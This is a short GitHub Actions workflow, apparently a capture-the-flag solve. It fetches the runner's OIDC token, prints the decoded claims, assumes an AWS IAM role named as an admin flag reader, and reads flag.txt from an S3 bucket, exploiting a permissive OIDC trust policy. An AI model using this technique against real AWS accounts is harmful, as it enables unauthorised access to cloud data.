name: pwn-flag
on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  grab:
    runs-on: ubuntu-latest

    # ใส่ permissions ในระดับ job ด้วย เผื่อ org policy เข้ม
    permissions:
      id-token: write
      contents: read

    steps:
      - uses: actions/checkout@v4

      # --- DEBUG OIDC: พิมพ์ claims มาดูว่า sub/aud ตรงมั้ย ---
      - name: Debug OIDC claims
        run: |
          set -e
          echo "Requesting OIDC token..."
          RESP=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                 "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          TOK=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "Decoded JWT header+claims:"
          echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null || python3 - <<'PY'
import sys,base64,json
b=sys.stdin.read().split('.')[1]
# fix padding
b += '=' * (-len(b)%4)
print(base64.b64decode(b).decode())
PY
          echo "----"

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875
          role-session-name: oops-we-did-it
          aws-region: ap-southeast-1

      - name: Read flag
        run: |
          aws s3 cp s3://oh-i-really-do-care/flag.txt -
